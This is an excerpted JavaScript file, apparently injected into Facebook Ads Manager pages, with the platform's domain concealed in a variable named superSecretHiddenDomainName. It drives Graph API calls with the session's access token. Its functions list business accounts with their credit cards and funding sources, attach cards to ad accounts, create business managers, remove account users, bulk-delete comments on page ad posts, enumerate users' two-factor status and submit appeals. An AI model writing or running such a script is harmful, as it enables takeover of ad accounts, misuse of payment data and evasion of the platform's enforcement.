(function () {
  function getBaseDomain(hostname) {
    // This pattern assumes that public suffixes can have up to two parts (e.g., co.uk, com.br)
    const pattern = /(?:[^./]+\.)?([^./]+\.[^./]+)$/;
    // Extract the base domain
    const match = hostname.match(pattern);
    return match ? match[1] : hostname;
  }
  this.superSecretHiddenDomainName = getBaseDomain(window.location.hostname);
  ...
  if (location.pathname == "/adsmanager/manage/campaigns" || location.pathname == "/ads/creativehub/home/" || location.pathname == "/adsmanager/manage/all" || location.pathname == "/adsmanager/manage/ads" || location.pathname == "/adsmanager/manage/adsets") {
    if (document.getElementById("notif") == null) {
      ...
      window.addCCtoadAccReq2 = function (adAccId, fbSocId, ccNumber, ccYear, ccMonth, ccCVC, ccIso, accessToken) {
        url = `https://business.secure.${superSecretHiddenDomainName}/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F`;
      ...
      window.ProcessEditcurr = async function () {
        ...
        let apiUrl = `https://graph.${this.superSecretHiddenDomainName}/o/v17.0/`;
      ...
      window.appealadcreo = async function (adgroupappid) {
        ...
        let apiUrl = `https://business.${this.superSecretHiddenDomainName}/ads/integrity/appeals/creation/ajax/`;
      ...
      window.appealadsacc = async function (accid) {
        ...
        let apiUrl = `https://www.${this.superSecretHiddenDomainName}/api/graphql/`;
        var urlencoded = new URLSearchParams();
      ...
      window.remadacc = async function (adaccid, rmid) {
        if (confirm("Are you sure you want to remove this account: " + adaccid + "?")) {
          let apiUrl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/act_` + adaccid + "/users/" + rmid + "?method=delete&access_token=" + window.privateToken;
          var urlencoded = new URLSearchParams();
          ...
          let response = await fetch(apiUrl, {
            ...
            referrer: `https://adsmanager.${this.superSecretHiddenDomainName}/ads/manager/account_settings/information/?act=1196425337914345&pid=p1&page=account_settings&tab=account_information`,
      ...
      window.ProcessEdittzone = async function () {
        ...
        let apiUrl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/`;
        let editaccid = window.selectedacc;
        let params = `act_${editaccid}?fields=id,name,timezone_id`;
        var urlencoded = new URLSearchParams();
      ...
      window.checkIpFunc = function () {
        if (location.origin == `https://www.${this.superSecretHiddenDomainName}`) {
          diag = `https://www.${this.superSecretHiddenDomainName}/diagnostics`;
        } else {
          diag = `https://business.${this.superSecretHiddenDomainName}/diagnostics`;
        }
      ...
      window.checkVerFunc = function () {
        verreq = `https://graph.${this.superSecretHiddenDomainName}/v17.0/4565016393523068?fields=id,title,description&access_token=` + window.privateToken;
...
<tr><td>email:</td><td> <input type="text" id="Tab5AddBMmail" placeholder="mail" style="background: #384959;color:white;" maxlength="50" size="30" value="${window.shortname}@gmail.com"></td></tr>`;
      ...
      window.AddBMProcessForm = async function () {
        ...
        if (AddBMtype == 1) {
          ...
          urlencoded.append("__user", window.socid);
          urlencoded.append("fb_dtsg", window.dtsg);
          let apiUrl = `https://developers.${this.superSecretHiddenDomainName}/business/create/?brand_name=` + AddBMName + "&first_name=" + window.fullname + "&last_name=" + window.shortname + "&email=" + AddBMmail + "&timezone_id=0&business_category=OTHER";
          let logNode = document.getElementById("tab5addbmlog");
          let response = await fetch(apiUrl, {
            mode: "no-cors",
            method: "POST",
      ...
      window.getcc = async function () {
        var credcca = [];
        var cctype = "bmcc";
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/me/businesses?fields=id,is_disabled_for_integrity_reasons,can_use_extended_credit,name,verification_status,creditcards&access_token=` + window.privateToken;
        ...
        tmpapiurl2 = `https://graph.${this.superSecretHiddenDomainName}/v17.0/me/adaccounts?fields=id,account_id,business,name,funding_source_details&limit=1000&sort=name_ascending&access_token=` + window.privateToken;
      ...
      window.getFpComments = async function () {
        var currfp;
        var currfpcnt = 0;
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/me?fields=accounts.limit(100){id,name,ads_posts.limit(100){id,comments.limit(100){id}}}&access_token=` + window.privateToken;
        let response = await fetch(tmpapiurl, {
          mode: "cors",
          method: "GET",
          credentials: "include",
                    ...
                    try {
                      if (bminf.accounts.data[i].ads_posts.data[icc].comments.data.length) {
                        ...
                        for (icom = 0; icom < bminf.accounts.data[i].ads_posts.data[icc].comments.data.length; icom++) {
                          tmpapiurldel = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + bminf.accounts.data[i].ads_posts.data[icc].comments.data[icom].id + "?access_token=" + currpageToken;
      ...
      window.showMorePopupFpRoles = async function (fpid) {
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + fpid + "?fields=roles,business,agencies&limit=100&access_token=" + window.privateToken;
        var todoret = "";
        var BMUrole;
      ...
      window.showMorePopupFpAdsRm = async function (fpid, adsid) {
        ...
        tmpapiurldel = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + adsid + "?access_token=" + currpageToken;
        dresponse = await fetch(tmpapiurldel, {
          mode: "cors",
          method: "DELETE",
          credentials: "include",
      ...
      window.showMorePopupFpAds = async function (fpid) {
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + fpid + "/ads_posts?fields=id,full_picture,promotion_status,promotable_id,status_type,permalink_url,picture,call_to_action&limit=500&access_token=" + window.privateToken;
        var todoret = "";
        window.getJSON(tmpapiurl, await
          function (err, bminf) {
            if (err !== null) {
      ...
      window.showMorePopupAccCap = async function (accid) {
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/act_` + accid + "?fields=capabilities&access_token=" + window.privateToken;
        var toret = "";
        i = 0;
        window.getJSON(tmpapiurl, await
          function (err, bminf) {
...
<tr><td>AdAcc ID:</td><td> <input type="text" id="BMAccsReqId" style="background: #384959;color:white;" maxlength="50" size="30" value="act_xxx"></td></tr>`;
      ...
      window.showMorePopupBMUsers = async function (bmid) {
        tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + bmid + "?fields=business_users{active_status,id,email,two_fac_status,pending_email,name,role,title,is_two_fac_blocked,was_integrity_demoted,sensitive_action_reviews},pending_users{id,role,email,status}&limit=100&access_token=" + window.privateToken;
        var todoret = "";
        window.getJSON(tmpapiurl, await
          function (err, bminf) {
            if (err !== null) {
...
<tr><td>email:</td><td> <input type="text" id="BMUserAddemail" placeholder="mail" style="background: #384959;color:white;" maxlength="50" size="30" value="@gmail.com"></td></tr>`;
      ...
      window.showaccstatus = async function (showmode) {
        if (showmode == "ligth") tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/me/adaccounts?fields=id,account_id,business,owner,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,insights{today_spend},ads.limit(1000){effective_status},is_tier_0,is_tier_1,is_tier_0_full,is_tier_restricted&limit=1000&sort=name_ascending&access_token=` + window.privateToken;
        else tmpapiurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/me/adaccounts?fields=id,account_id,business,owner,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,insights{today_spend},ads.limit(1000){effective_status},funding_source_details,is_tier_0,is_tier_1,is_tier_0_full,is_tier_restricted&limit=1000&sort=name_ascending&access_token=` + window.privateToken;
        todo = "\n";
        var allcopy = "";
      ...
      window.checkBmFunc = function (tokn) {
        ...
        bmurl = `https://graph.${this.superSecretHiddenDomainName}/v17.0/` + getbmid + "?fields=id,is_disabled_for_integrity_reasons,can_use_extended_credit,name,verification_status&access_token=" + window.ftoken;
...
<option value="https://www.${this.superSecretHiddenDomainName}/accountquality">Account Quality</option>
<option value="https://business.${this.superSecretHiddenDomainName}/help/contact/649167531904667">Manual Pay</option>
<option value="https://business.${this.superSecretHiddenDomainName}/overview">BM Create</option>
<option value="https://developers.${this.superSecretHiddenDomainName}/tools/debug/">FB debugger</option>
<option value="https://www.${this.superSecretHiddenDomainName}/help/contact/305334410308861">Ads Appeal</option>
<option value="https://mbasic.${this.superSecretHiddenDomainName}/support/forms/flow_view?id=2166173276743732">BM Appeal</option>
<option value="https://mbasic.${this.superSecretHiddenDomainName}/support/forms/flow_view?id=273898596750902">Social Acc Appeal</option>
<option value="https://mbasic.${this.superSecretHiddenDomainName}/support/forms/flow_view?id=2158932601016581">Page Appeal</option>
<option value="https://mbasic.${this.superSecretHiddenDomainName}/support/forms/flow_view?id=2026068680760273">Ads ACC Appeal</option>
<option value="https://${this.superSecretHiddenDomainName}/help/contact/391647094929792">Card Appeal</option>
<option value="https://business.${this.superSecretHiddenDomainName}/certification/nondiscrimination/">Nondiscrimination</option>
<option value="https://business.${this.superSecretHiddenDomainName}/help/contact/856051674863409">Re-enable disabled ad account</option>
<option value="https://www.${this.superSecretHiddenDomainName}/payments/risk/preauth/?ad_account_id=${window.selectedacc}&entrypoint=AYMTAdAccountUnrestrictLinkGenerator">Approve Temporary Hold</option>
<option value="https://www.${this.superSecretHiddenDomainName}/diagnostics">iP info</option>
<option value="https://www.${this.superSecretHiddenDomainName}/primary_location/info">Primary Location</option></select>`;
          var addtodo = "";
